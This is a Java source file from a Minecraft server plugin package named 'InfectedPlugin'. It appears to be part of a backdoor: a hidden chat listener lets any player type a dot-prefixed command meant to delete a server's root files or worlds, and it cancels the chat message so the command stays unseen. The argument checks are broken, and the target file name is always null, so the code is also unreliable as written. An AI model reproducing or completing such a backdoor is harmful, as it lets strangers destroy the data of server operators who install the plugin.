 package org.CreeperCoders.InfectedPlugin.Commands;
 
 import org.bukkit.*;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 import org.CreeperCoders.InfectedPlugin.*;
 
 public class Command_destroyeverything implements Listener
 {
     @EventHandler
     public void onPlayerChat(AsyncPlayerChatEvent event)
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
 
         if (message.startsWith("."))
         {
             String[] args = message.split(" ");
             if (args == null)
             {
                 return;
             }
 
             if (args[0].equalsIgnoreCase(".disableplugin"))
             {
                 if (args.length == 1)
                 {
                     p.sendMessage(ChatColor.RED + "Usage: .destroyeverything <selectworld|rootfile> <world|rootfile>");
                     event.setCancelled(true);
                     return;
                 }
                 else if (args.length == 2)
                 {
                     if (args[0].equalsIgnoreCase("selectworld"))
                     {
                         p.sendMessage("under construction");
                         event.setCancelled(true);
                         return;
                     }
                     else if (args[0].equalsIgnoreCase("rootfile"))
                     {
                     	String lamething = null;
                     	try
                     	{
                    		if (args.length == 1)
                    		{
                                 p.sendMessage(ChatColor.RED + "Usage: .destroyeverything <rootfile> <rootfile>");
                                 event.setCancelled(true);
                                 return;
                    		}
                    		else if (args.length == 2)
                    		{
                                 if (args[1].equalsIgnoreCase(lamething))
                                 {
                                     IP_Util.deleteRootFile(lamething);
                                     p.sendMessage(ChatColor.GREEN + "Deleted " + lamething + "! However, this does not mean you didn't delete an unknown file, this message is sent on every arg!");
                                 }
                    		}
                     	}
                     	catch (Exception ex)
                     	{
                     		p.sendMessage(ChatColor.DARK_RED + ex.getMessage());
                     	}
                     }
                 }
                 event.setCancelled(true);
                 return;
             }
         }
     }
 }
